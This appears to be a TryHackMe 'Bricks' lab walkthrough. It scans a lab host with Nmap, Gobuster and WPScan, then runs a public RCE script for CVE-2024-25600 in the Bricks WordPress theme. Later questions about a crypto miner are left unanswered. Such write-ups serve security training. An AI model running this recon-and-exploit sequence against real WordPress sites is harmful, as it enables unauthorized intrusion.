Note: Add 10.10.176.9 bricks.thm to your /etc/hosts file.
Open the `/etc/hosts` file with root privileges using a text editor:
```BASH
sudo nano /etc/hosts
```
Add the following line:
```BASH
10.10.176.9 bricks.thm
```

First, run an Nmap scan to identify open ports and determine which services are running:
```BASH
nmap -sV 10.10.176.9
```
![image](https://github.com/user-attachments/assets/1ab3004c-0fcf-4fe9-a42a-6dba08e34570)

The Nmap scan reveals that the web application is served over HTTPS on port 443 via Apache.

![image](https://github.com/user-attachments/assets/d2eaecc1-3261-4476-84c0-396c2399c79d)

From the Gobuster scan, it appears that the website is running WordPress:
```BASH
gobuster dir -u "https://bricks.thm/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 10 -x .txt,.php -k
```
![image](https://github.com/user-attachments/assets/5f916e06-d546-4715-8606-69b703d0a1c7)

<span style="line-height:0.5;">&nbsp;</span>

### What is the content of the hidden .txt file in the web folder?
Use [WPscan](https://wpscan.com/) to enumerate the WordPress instance:
```BASH
wpscan --url https://bricks.thm --disable-tls-checks --enumerate u,vp,vt
```
- url - target URL
- disable-tls-checks - skip the expired cert problem (same as -k)
- u - enumerate usernames
- vp - vulnerable plugins
- vt - vulnerable themes

![image](https://github.com/user-attachments/assets/6e22649a-d7c3-4caa-9909-8f09a6f0c2d0)

WPScan shows that this version of the Bricks WordPress theme is vulnerable to [CVE-2024-25600](https://nvd.nist.gov/vuln/detail/CVE-2024-25600). Download the [Remote Code Execution (RCE) script](https://github.com/Chocapikk/CVE-2024-25600) for CVE-2024-25600.

Run the script:
```BASH
python3 CVE-2024-25600.py -u https://bricks.thm
```

<span style="line-height:0.5;">&nbsp;</span>

### What is the name of the suspicious process?

<span style="line-height:0.5;">&nbsp;</span>

### What is the service name affiliated with the suspicious process?

<span style="line-height:0.5;">&nbsp;</span>

### What is the log file name of the miner instance?

<span style="line-height:0.5;">&nbsp;</span>

### What is the wallet address of the miner instance?

<span style="line-height:0.5;">&nbsp;</span>

### The wallet address used has been involved in transactions between wallets belonging to which threat group?
